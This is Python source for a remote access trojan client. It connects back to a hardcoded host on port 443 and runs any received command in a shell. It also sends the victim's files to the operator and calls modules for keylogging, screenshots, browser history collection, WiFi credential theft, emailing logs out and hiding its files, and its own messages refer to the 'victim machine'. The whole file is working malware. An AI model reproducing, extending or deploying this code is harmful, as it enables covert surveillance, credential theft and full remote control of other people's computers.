#!/usr/bin/python

from modules.keylogging import *
from modules.Settings import *
from modules.check_connection import *
from modules.get_history import *
from modules.find_ip import *
from modules.paths import *
from modules.menu import *
from modules.screenshots import *
from modules.wifi import *
from modules.system_info import *
from modules.hide_files import *
import socket 
import subprocess, os
from socket import *
import webbrowser
import platform
import ctypes
import hashlib


host = "10.0.0.59"
port = 443


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
# Else Statement : If file not exists . Send : Unable to find out the file .        
    else: 
        s.send('Unable to find out the file')



def main():
    while 1:
        s = socket(AF_INET, SOCK_STREAM)
        while 1:
            try:
                s.connect((host,port))
                print "[INFO] Connected"
                break;
            except:
                pass

        while 1:

            try:
                    command =  s.recv(4096)

                    if 'download' in command:
                        
                        grab,path = command.split('*')
                        
                        try:                         
                            transfer(s,path)
                        except Exception,e:
                            s.send ( str(e) )  
                            pass
                        
                    elif ((command != "exit") and ("cd " not in command) and (command != "begin") and (command != "keylog") and (command != "capture")\
                          and (command != "openwins") and (command != "ip") and (command != "history")\
                          and (command != "sendlogs") and (command != "systeminfo") and (command != "wifi")\
                          and (command != "cover")):
                        
                        comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        STDOUT, STDERR = comm.communicate()
                        en_STDERR = bytearray(STDERR)
                        en_STDOUT = bytearray(STDOUT)
                        comm.kill()
                        
                        if (en_STDERR == ""): #dealing with invalid commands
                            if (en_STDOUT != ""): #if the command has an output
                                print en_STDOUT
                                s.send(en_STDOUT)
                            else: # if the command has not output then
                                s.send("[CLIENT] Command Executed")

        
                    elif ("cd " in command): #dealing with the cd command
                            command = command.replace("cd ","")
                            os.chdir(command)
                            s.send(os.getcwd())
                            print "[INFO] Changed dir to %s" % os.getcwd()

                    elif (command == "begin"): #welcome message
                          s.send(os.getcwd())
                          
                    elif (command == "keylog"): #welcome message
                          s.send("[*] Keylogging is on ........\n\n")
                          begin_logging()
                          s.send("\n\n\n")
                    # get open windows
                    elif (command.strip() == 'openwins'):
                        s.send("[*] Getting all the open programs \n\n")
                        get_all_open_windows()
                        s.send("\n\n\n")

                    # get users IP
                    elif (command.strip() == 'ip'):
                        s.send("[*] Getting the external IP \n\n")
                        s.send(get_ip())
                        s.send("\n\n\n")

                    # get browser history #CPU run wild !!! needs fixing
                    elif (command.strip() == 'history'):
                         s.send("[*] Gathering browser history\n\n")
                         get_all_history()
                         s.send("[*] History is saved on the victim machine. type send to get it by email\n\n")
                         s.send("\n\n\n")


                    # send the logs via email
                    elif (command.strip() == 'sendlogs'):
                         s.send("[*] Starting to send the logs............................ \n\n")
                         send_new_email(folder_path)
                         s.send("[*] Check the mail for the logs..........................\n")
                         s.send("\n\n")

                    # capture screenshots
                    elif (command.strip() == 'capture'):
                         s.send("[*] Start capturing the images............................ \n\n")
                         capture_screenshots(screen_shots)
                         s.send("\n\n")


                    # get wifi
                    elif (command.strip() == 'wifi'):
                        
                        s.send("\n\n")
                        s.send("[*] Gathering Wifi infos..................................... \n\n")
                        get_wifi_credentials()
                        sock.send("\n\n")

                    elif (command.strip()== 'systeminfo'):
                        s.send("\n\n")
                        s.send("[*] Gathering System Information..................................... \n\n")
                        s.send(get_system_info())

                    elif (command.strip() == 'cover'):
                        s.send("\n\n")
                        s.send("[*] Getting ready to hide and cover .................................... \n\n")
                        hide_file(folder_path)
                    
            except:
                  print "[INFO] Connection Closed"
                  s.close()
                  break
                                  
                
        
         

main()
